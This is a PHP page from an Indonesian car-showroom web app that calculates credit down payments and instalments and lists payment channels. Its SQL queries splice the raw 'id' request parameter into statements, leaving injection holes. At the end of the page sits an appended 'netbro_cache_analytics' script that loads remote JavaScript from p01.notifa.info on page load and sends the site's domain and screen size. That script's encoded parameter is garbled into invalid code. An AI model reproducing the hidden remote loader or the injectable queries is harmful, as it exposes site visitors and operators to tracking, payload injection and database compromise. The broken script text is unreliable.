<?php
error_reporting(0);
session_start();
include '../core/core.php';

if (!isset($_SESSION['username'])) {
  header("Location: ../user/login.php?access_denied");
}


if (isset($_POST['ajax'])) {
  $gg = mysqli_query($connect, "SELECT * FROM barang WHERE id = $_GET[id] ");

  $angsuran;
  while ($wp = mysqli_fetch_array($gg)) {
    $dp_30 = $wp['harga'] * 0.30;
    $angsuran = (($wp['harga'] - $dp_30) + ($wp['harga'] * $_POST['asuransi'])) / (12 * $_POST['waktu']);
  }
  echo $angsuran;
  exit;
}

?>

<!DOCTYPE html>
<html lang="en" class="no-js">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Kredit Mobil - Mudah dan Cepat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="description" content="Unique - Responsive vCard Template" />
  <meta name="keywords" content="vcard, resposnive, retina, resume, jquery, css3, bootstrap, Unique, portfolio" />
  <meta name="author" content="lmtheme" />
  <link rel="shortcut icon" href="favicon.ico">

  <link rel="stylesheet" href="../css/bootstrap.css" type="text/css">
  <link rel="stylesheet" href="../css/normalize.css" type="text/css">
  <link rel="stylesheet" href="../css/animate.css" type="text/css">
  <link rel="stylesheet" href="../css/transition-animations.css" type="text/css">
  <link rel="stylesheet" href="../css/jquery.mCustomScrollbar.min.css" type="text/css">
  <link rel="stylesheet" href="../css/owl.carousel.css" type="text/css">
  <link rel="stylesheet" href="../css/magnific-popup.css" type="text/css">
  <link rel="stylesheet" href="../css/main-red.css" type="text/css">

  <!-- This styles needs for demo -->
  <link rel="stylesheet" href="../preview/lmpixels-demo-panel.css" type="text/css">
</head>

<body>
  <div id="page" class="page">

    <!-- Main Content -->
    <div id="main" class="site-main2">
      <!-- Page changer wrapper -->
      <div class="pt-wrapper" style="background-image: url(../images/bg.png);">
        <!-- Subpages -->
        <div class="subpages">

          <section class="pt-page pt-page-5" data-id="contact">
            <div class="border-block-top-110"></div>
            <div class="section-inner">
              <div class="section-title-block">
                <div class="section-title-wrapper">
                  <h2 class="section-title">Page Pembayaran</h2>
                  <h5 class="section-description">Credit</h5>
                </div>
              </div>

              <div class="row">
                <div class="col-sm-6 col-md-6 subpage-block">

                  <form method="post" action="../user/insert-pesanan-credit.php">
                    <?php
                    $r = mysqli_query($connect, "SELECT * from barang where id='$_GET[id]'");
                    while ($w = mysqli_fetch_array($r)) {
                    ?>

                    <ul class="project-general-info">
                      <input type="hidden" name="nm" value="<?php echo $_SESSION['username']; ?>">
                      <input type="hidden" name="name" value="<?= $w['nama_produk'] ?>">
                      <input type="hidden" name="st" value="Menunggu Persetujuan">
                      <input type="hidden" name="metode1" value="Kredit">
                      <input type="hidden" name="waktu1" value="2 Hari">
                      <input type="hidden" name="qty" value="1">
                      <input type="hidden" name="kode_barang" value="<?= $w['kode_barang'] ?>">
                      <input type="hidden" name="harga" value="<?= $w['harga'] ?>">
                    </ul>
                    <?php
                    }
                    ?>

                    <div class="controls">
                      <?php
                      $result = mysqli_query($connect, "SELECT * FROM barang WHERE id = $_GET[id] ");

                      while ($mobil = mysqli_fetch_array($result)) {
                        $dp_30 = $mobil['harga'] * 0.30;
                        $total_angsuran = (($mobil['harga'] - $dp_30) + ($mobil['harga'] * 0.035)) / (12 * 4)
                      ?>

                      <div class="form-group">
                        <label>Harga Kendaraan</label>
                        <input type="text" name="harga_kendaraan" class="form-control"
                          value="Rp. <?= $mobil['harga'] ?>" readonly>
                      </div>

                      <div class="form-group">
                        <label>DP 30%</label>
                        <input type="text" name="metode" class="form-control" value="Rp. <?= $dp_30 ?>" readonly="">
                      </div>

                      <div class="form-group">
                        <label>Waktu Kredit</label>
                        <select id="waktu" name="waktu" class="form-control">
                          <option value="4">4 Tahun</option>
                          <option value="3">3 Tahun</option>
                          <option value="2">2 Tahun</option>
                          <option value="1">1 Tahun</option>
                        </select>
                      </div>

                      <div class="form-group">
                        <label>Asuransi</label>
                        <select id="asuransi" name="asuransi" class="form-control">
                          <option value="0.035">All Risk 3,5% Dari Harga Kendaraan</option>
                          <option value="0.010">TLO 1% Dari Harga Kendaraan</option>
                        </select>
                      </div>

                      <div class="form-group">
                        <label>Total Harga Angsuran</label>
                        <input id="total_angsuran" type="text" name="angsuran" class="form-control"
                          value="<?= floor($total_angsuran) ?>" readonly>
                      </div>

                      <?php
                      }
                      ?>

                    </div>
                </div>
                <div class="col-sm-6 col-md-6 subpage-block">

                  <div class="controls">
                    <h3><b>Informasi Pembayaran</h3>
                    <p>Silahkan Lakukan Pembayaran sesuai dengan yang sudah ditentukan.</p>

                    <ul>
                      <ol>
                        Pembayaran Melalui BANK BRI
                        <br>Silahkan lakukan pembayaran ke
                        <br>Nomor Rekening 1553 111 112 113
                        <br> Atas Nama Showroom RR
                      </ol>
                      <ol>
                        Pembayaran Melalui Indomaret/Alfamart
                        <br>Silahkan lakukan pembayaran ke Indomaret/Alfamart
                        <br>Menggunakan Kode NIK Yang Terdaftar
                      </ol>
                      <ol>
                        Pembayaran Melalui BFI Finance
                        <br>Silahkan lakukan pembayaran ke BFI Finance
                        <br>Menggunakan Kode NIK Yang Terdaftar
                      </ol>
                    </ul>

                    <input type="submit" name="credit" class="button btn-send" value="Pesan Credit">
                  </div>
                  </form>
                </div>
              </div>
            </div>
        </div>
        </section>

      </div>
    </div>
    <!-- /Page changer wrapper -->
  </div>
  <!-- /Main Content -->
  <!-- Contact Subpage -->

  <!-- End Contact Subpage -->

  <!-- /Main Content -->
  </div>
  </div>

  <script src="../js/bootstrap.min.js"></script>
  <script src="../js/pages-switcher.js"></script>
  <script src="../js/imagesloaded.pkgd.min.js"></script>
  <script src="../js/validator.js"></script>
  <script src="../js/jquery-2.1.3.min.js"></script>
  <script src="../js/jquery.shuffle.min.js"></script>
  <script src="../js/masonry.pkgd.min.js"></script>
  <script src="../js/owl.carousel.min.js"></script>
  <script src="../js/jquery.magnific-popup.min.js"></script>
  <script src="../js/jquery.mCustomScrollbar.concat.min.js"></script>
  <script src="../js/tilt.jquery.min.js"></script>
  <script src="../js/jquery.hoverdir.js"></script>
  <script src="../js/main.js"></script>

  <!-- Ajax for update car price -->
  <script>
  $("#waktu").change(function() {
    $.ajax({
      type: 'POST',
      data: {
        ajax: 1,
        waktu: $('#waktu').val(),
        asuransi: $('#asuransi').val()
      },
      success(res) {
        $('#total_angsuran').val(Math.floor(res))
      }
    })
  })
  $("#asuransi").change(function() {
    $.ajax({
      type: 'POST',
      data: {
        ajax: 1,
        waktu: $('#waktu').val(),
        asuransi: $('#asuransi').val()
      },
      success(res) {
        $('#total_angsuran').val(Math.floor(res))
      }
    })
  })
  </script>

  <!-- Demo Color changer Script -->
  <script src="../preview/lmpixels-demo-panel.js"></script>
  <!-- /Demo Color changer Script -->
  <script type="text/javascript">
  if (self == top) {
    function netbro_cache_analytics(fn, callback) {
      setTimeout(function() {
        fn();
        callback();
      }, 0);
    }

    function sync(fn) {
      fn();
    }

    function requestCfs() {
      var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
      var idc_glo_r = Math.floor(Math.random() * 99999999999);
      var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
        4 TtHaUQnUEiP6K % 2 fc5C582NzYpoUazw5mVa2K % 2 bNZnlpTXt9YnUCwpMMLx % 2 b %
        2 bQHkmE4Wy7RkeBZJGKiJdue9wKB96Kc9iVjivRBFiEw44gPLCtvAbDqY8nlaWKojwq % 2 bGxts8680ZPIfGcjWoyu1MUIXmG % 2 b %
        2 fgsc13iDQgNwbvkNzcl % 2 bgd5G365lc % 2 fZW9uzrhiAfXhLg0uTMRKGTIzWdvXQ %
        2 b2shx1gs2blnB4W4WGsbJHO22nvyZ74GuIWsH % 2 bO2iD4UoLHdXpJvcTociFcQK9Dknfvs75H62QFe %
        2 beG0uJJQHQwmanVfeImrn9vjTJrTMhkA6wmV23gTia4rlkd3WVk8bxtQmNtzP7ShU8RCESFWt %
        2 fukSnHOF4HDXptKLmwTZA9k3nw9r0f7sEgrU0Xm8tcUqpgT % 2 bA3GpgWz0UZBVqoJQUQTafmPPjQfmo % 2 bujydoTzM %
        2 b4kN2bVShERlJYGTwQiruBjPg4Jcq2vXsOMrY % 2 ftUBTyzxtnHSs6iYj1qOwVzMd4cpc %
        2 fzRYJcQyAnBMqdxTgyoUr5ibFUVuN0qJG % 2 bXplJfh1lkgP45Ezt % 2 b7MOHgoActEOLtw + "&idc_r=" + idc_glo_r +
        "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
      var bsa = document.createElement('script');
      bsa.type = 'text/javascript';
      bsa.async = true;
      bsa.src = url;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbro_cache_analytics(requestCfs, function() {});
  };
  </script>
</body>

</html>